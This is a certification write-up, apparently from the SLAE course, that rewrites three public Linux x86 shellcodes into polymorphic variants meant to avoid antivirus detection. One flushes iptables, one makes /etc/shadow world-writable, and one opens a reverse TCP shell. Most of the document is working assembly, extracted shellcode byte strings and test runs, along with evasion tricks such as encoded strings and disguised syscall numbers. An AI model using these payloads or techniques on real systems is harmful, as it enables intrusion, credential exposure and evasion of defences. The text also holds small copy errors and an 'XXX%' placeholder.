# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.

# Choosing shellcodes

For the polymorphism exercises, I decided to choose three shellcodes from different authors with a real offensive usage. In my humble opinion, send Phuck3d! to all terminals (http://shell-storm.org/shellcode/files/shellcode-604.php) or open the CD drive (http://shell-storm.org/shellcode/files/shellcode-621.php/http://shell-storm.org/shellcode/files/shellcode-653.php) does not have real usage in an offensive assessment. 

#  Linux/x86 - iptables -F - 58 bytes by dev0id
Source: http://shell-storm.org/shellcode/files/shellcode-361.php

## Original shellcode

```ASM
jmp short callme
main:
 pop esi
 xor eax,eax
 mov byte [esi+14],al
 mov byte [esi+17],al
 mov long [esi+18],esi
 lea  ebx,[esi+15]
 mov long [esi+22],ebx
 mov long [esi+26],eax
 mov  al,0x0b
 mov ebx,esi
 lea ecx,[esi+18]
 lea edx,[esi+26]
 int 0x80
 
callme:
 call main
 db '/sbin/iptables#-F#'
```

This shellcode flush iptables rules (local Linux Firewall). In order to test the shellcode filtering rules must be set, with root privileges:

```sh
$ nasm -f elf32 iptable-shellstrom.nasm && ld -N -z execstack -o iptable-shellstrom iptable-shellstrom.o
$ sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
$ sudo iptables -L INPUT
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     all  --  anywhere             anywhere             ctstate ESTABLISHED
$ sudo ./iptable-shellstrom
$ sudo iptables -L INPUT
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
```
## Tricks

Polymorphism tricks will be:
  * Change the string '/sbin/iptables#-F#'
  * Do not put 0x0b into al which is known for calling execve
  * Do not use xor eax,eax (or others register)
  * Add junk code

## Polymorphism
"/sbin/iptables#-F#" become 0tcjo0jqubcmft#.G#

In order to decode the string a simple loop is used:
```ASM
main:
 pop esi
 mov ecx, eax ; Used for replace xor ecx, ecx
 xor ecx, eax ;
 mov cl, 17

decode:
 inc byte [esi], 1
 inc esi
 loop decode

 sub esi, 17
```

Let's move EXC into EAX to set EAX to zero and increment al as we decode the string.

```ASM
main:
 pop esi
 mov ecx, eax ; Used for not xor ecx, ecx
 xor ecx, eax ;
 mov eax, ecx
 mov cl, 17

decode:
 inc byte [esi], 1
 inc esi
 inc al
 loop decode
```

At the end AL is set to 17, in order to set it to 0xb (11) let's subtract 6 and add junk code. At the end of the decode loop, EAX is set. EAX/AL cannot be used as a null byte, but ECX/CL can.

```ASM
main:
 pop esi
 mov ecx, eax ; Used for not xor ecx, ecx
 xor ecx, eax ;
 mov eax, ecx
 mov cl, 17

decode:
 inc byte [esi], 1
 inc esi
 inc al
 loop decode

 sub esi, 17

 mov byte [esi+14],cl ;replace al by cl
 mov byte [esi+17],cl ;replace al by cl
 mov long [esi+18],esi
 inc ebx ;do nothing
 lea  ebx,[esi+15]
 mov long [esi+22],ebx
 mov long [esi+26],ecx ;replace eax by ecx
 sub al, 6
 mov ebx,esi
 lea ecx,[esi+18]
 xchg ebx, ebx ;do nothing
 lea edx,[esi+26]
 int 0x80
```
Let's try this out!

## Compilation
```sh
$ nasm -f elf32 iptable-poly.nasm
$ bash ../get-shellcode.sh iptable-poly.o
"\xeb\x34\x5e\x89\xc1\x31\xc1\x89\xc8\xb1\x11\xfe\x0e\x46\xfe\xc0\xe2\xf9\x83\xee\x11\x88\x4e\x0e\x88\x4e\x11\x89\x76\x12\x43\x8d\x5e\x0f\x89\x5e\x16\x89\x4e\x1a\x2c\x06\x89\xf3\x8d\x4e\x12\x87\xdb\x8d\x56\x1a\xcd\x80\xe8\xc7\xff\xff\xff\x30\x74\x63\x6a\x6f\x30\x6a\x71\x75\x62\x63\x6d\x66\x74\x23\x2e\x47\x23"
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED -j ACCEPT
$ sudo iptables -L INPUT
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere             ctstate ESTABLISHED
$ sudo ./shellcode 
Shellcode Length:  77
$ sudo iptables -L INPUT
Chain INPUT (policy ACCEPT)
target     prot opt source               destination 
```

It works, new size of the shellcode is 77 (140% of the original size):
```SH
$ echo 'scale=3; 77/55*100' |bc
140.000
```

#  Linux/x86 - setuid(0) + chmod(/etc/shadow, 0666) - 37 Bytes by antrhacks
Source: http://shell-storm.org/shellcode/files/shellcode-608.php

## Original shellcode

```ASM
xor    %ebx,%ebx
mov    $0x17,%al
int    $0x80
xor    %eax,%eax
push   %eax
push   $0x776f6461
push   $0x68732f63
push   $0x74652f2f
mov    %esp,%ebx
mov    $0x1b6,%cx
mov    $0xf,%al
int    $0x80
inc    %eax
int    $0x80
```
In order to get the shellcode in Intel format, let's just create an ASM file with this code, compile them using GNU Assembler (*gas* ou *as*; which came with *binutils* package).

Note: on a x64 system, compilation must by adding *--32*.

Once code is compiled it can be easily extracted using:  *objdump -d ./a.out -M intel|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -c24-100*. For this, shellcode, only the main part will be compiled.

```ASM
xor    ebx,ebx
mov    al,0x17
int    0x80
xor    eax,eax
push   eax
push   0x776f6461
push   0x68732f63
push   0x74652f2f
mov    ebx,esp
mov    cx,0x1b6
mov    al,0xf
int    0x80
inc    eax
int    0x80
```

A quick analyse of the shellcode shows that syscal 0x17 (23 / *setuid*) is called with 0. Then, *//etc/shadow* is pushed on the stack and syscal 0xF/15 (chmod) is called with 0x1b6 (666) as argument. Finally, if chmod suceed, 0xffffffff is put in EAX and syscall 0 (exit) is called. 

```sh
$ grep 23 /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_setuid   23
$ grep 15 /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_chmod   15
$ grep 0 /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_restart_syscall      0
$ grep 1 /usr/include/i386-linux-gnu/asm/unistd_32.h
#define __NR_exit
```

Let's try this shellcode and restore access right on */etc/shadow*:

```sh
$ ls -al /etc/shadow
-rw-r----- 1 root shadow 1123 août  19 22:04 /etc/shadow
$ nasm -f elf32 original.nasm && ld -N -z execstack -o original original.o
$ ./original 
Erreur de segmentation (core dumped)
$ sudo ./original 
$ ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 1123 août  19 22:04 /etc/shadow
$ sudo chmod 640 /etc/shadow
```

## Tricks

Polymorphism tricks will be:
 * Change the string *//etc/shadow'*
 * Do not put 0x17 or 0xf into al which are known for calling setuid or chmod.

## Polymorphism

In order to change *//etc/shadow*, each hexadecimal value will be increased by 0x01020304. Restoring the initial value will be done using a register in order to do not have mutliple 0x01020304 call in the shellcode.

For syscall, 0xd will be put in AL because this is syscall for time which is normally not triggered by antivirus.

```ASM
xor    ebx,ebx
mov    al,0xd ; syscall for time
add al,10
int    0x80
xor    eax,eax
push   eax

mov ebx,   0x78716765
mov ecx, 0x01020304 ;a register is used in order to reduce polymorphism length
sub ebx, ecx
push ebx
mov ebx,  0x69753267
sub ebx, ecx
push ebx
mov ebx,  0x75673233
sub ebx, ecx
push ebx

mov    ebx,esp
mov    cx,0x1b6
mov    al,0xd ; syscall for time
add al,2
int    0x80
inc    eax
int    0x80
```

Let's try this out!

## Compilation

```sh
$ nasm -f elf32 chmod-poly.nasm 
$ ld -N -z execstack -o chmod-poly chmod-poly.o
$ bash get-shellcode.sh chmod-poly
"\x31\xdb\xb0\x0d\x04\x0a\xcd\x80\x31\xc0\x50\xbb\x65\x67\x71\x78\xb9\x04\x03\x02\x01\x29\xcb\x53\xbb\x67\x32\x75\x69\x29\xcb\x53\xbb\x33\x32\x67\x75\x29\xcb\x53\x89\xe3\x66\xb9\xb6\x01\xb0\x0d\x04\x02\xcd\x80\x40\xcd\x80"
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  55
Segmentation fault (core dumped)
$ sudo ./shellcode 
Shellcode Length:  55
$ ls -al /etc/shadow
-rw-rw-rw- 1 root shadow 1123 août  19 22:04 /etc/shadow
```

It works, new size of the shellcode is 55 (148.6% of the original size):
```sh
$ echo "scale=3; 55/37*100" |bc
148.600
```

#  Linux/x86 - Shell Reverse TCP Shellcode - 74 bytes by Julien Ahrens
Source: http://shell-storm.org/shellcode/files/shellcode-883.php

## Original shellcode

The original shellcode is a classic reverse shell as done in the first exercise.

```ASM
*  00000000 <_start>:
*  0:   6a 66                push   0x66
*  2:   58                   pop    eax
*  3:   6a 01                push   0x1
*  5:   5b                   pop    ebx
*  6:   31 d2                xor    edx,edx
*  8:   52                   push   edx
*  9:   53                   push   ebx
*  a:   6a 02                push   0x2
*  c:   89 e1                mov    ecx,esp
*  e:   cd 80                int    0x80
* 10:   92                   xchg   edx,eax
* 11:   b0 66                mov    al,0x66
* 13:   68 7f 01 01 01       push   0x101017f <ip: 127.1.1.1
* 18:   66 68 05 39          pushw  0x3905 <port: 1337
* 1c:   43                   inc    ebx
* 1d:   66 53                push   bx
* 1f:   89 e1                mov    ecx,esp
* 21:   6a 10                push   0x10
* 23:   51                   push   ecx
* 24:   52                   push   edx
* 25:   89 e1                mov    ecx,esp
* 27:   43                   inc    ebx
* 28:   cd 80                int    0x80
* 2a:   6a 02                push   0x2
* 2c:   59                   pop    ecx
* 2d:   87 da                xchg   edx,ebx
*
* 0000002f <loop>:
* 2f:   b0 3f                mov    al,0x3f
* 31:   cd 80                int    0x80
* 33:   49                   dec    ecx
* 34:   79 f9                jns    2f <loop>
* 36:   b0 0b                mov    al,0xb
* 38:   41                   inc    ecx
* 39:   89 ca                mov    edx,ecx
* 3b:   52                   push   edx
* 3c:   68 2f 2f 73 68       push   0x68732f2f
* 41:   68 2f 62 69 6e       push   0x6e69622f
* 46:   89 e3                mov    ebx,esp
* 48:   cd 80                int    0x80
```

## Tricks

Polymorphism tricks will be:
 * Change the string *//etc/shadow'*
 * Do not put 0x17 or 0xf into al which are known for calling setuid or chmod.

 * *xchg   edx,ebx* (87 da) is replaced by *cdq* (99) which is smaller. CQD extend EAX sign to EDX. 
 * *xor edx, edx* will be replace by the same instruction. This will set the shellcode shorter.
* Do not set 0xb (execve) or 0x3f (dup2) in AL. Times syscall value (0x2b) will be put in AL before being changed.
* Add junk code between pushing IP and port

## Polymorphism

```ASM
global _start

section .text
_start:
 push   0x66
 pop    eax
 push   0x1
 pop    ebx
 cdq
 push   edx
 push   ebx
 push   0x2
 mov    ecx,esp
 int    0x80
 xchg   edx,eax
 mov    al,0x66
 push   0x0101017f
 inc eax ;junk
 clz ;junk
 clc ;junj
 push word 0x3905 
 dec eax ;junk
 inc    ebx
 push   bx
 mov    ecx,esp
 push   0x10
 push   ecx
 push   edx
 mov    ecx,esp
 inc    ebx
 int    0x80
 push   0x2
 pop    ecx
 cdq
loop:
 mov    al,0x2b
 add al, 0x14
 int    0x80
 dec    ecx
 jns    loop

 mov    al,0xd
 sub al, 2
 inc    ecx
 push   ecx
 mov edx, 0x01020304
 mov esi, 0x69753233
 sub esi, edx
 push esi
 mov esi, 0x6f6b6533
 sub esi, edx
 push esi
 mov    edx,ecx
 mov    ebx,esp
 int    0x80
```

## Compilation

Before running the shellcode, start a listener on port 1337.

```
$ nc -lv 1337
```

Compilation is the same as usual. However a warning is set because of junk code.

```sh
$ nasm -f elf32 reverse-poly.nasm 
reverse-poly.nasm:19: warning: label alone on a line without a colon might be in error
$ ld -N -z execstack -o reverse-poly reverse-poly.o
$ bash ~/exam/get-shellcode.sh reverse-poly
"\x6a\x66\x58\x6a\x01\x5b\x99\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x40\xf8\x66\x68\x05\x39\x48\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x99\xb0\x2b\x04\x14\xcd\x80\x49\x79\xf7\xb0\x0d\x2c\x02\x41\x51\xba\x04\x03\x02\x01\xbe\x33\x32\x75\x69\x29\xd6\x56\xbe\x33\x65\x6b\x6f\x29\xd6\x56\x89\xca\x89\xe3\xcd\x80"
$ leafpad shellcode.c 
$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode 
Shellcode Length:  90
```

The reverse shell is open:

```
$ nc -lv 1337
Connection from 127.0.0.1 port 1337 [tcp/*] accepted
id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
exit
```

It works, new size of the shellcode is 90 (XXX% of the original size):
```sh
$ echo "scale=3; 90/74*100" |bc
121.600
```
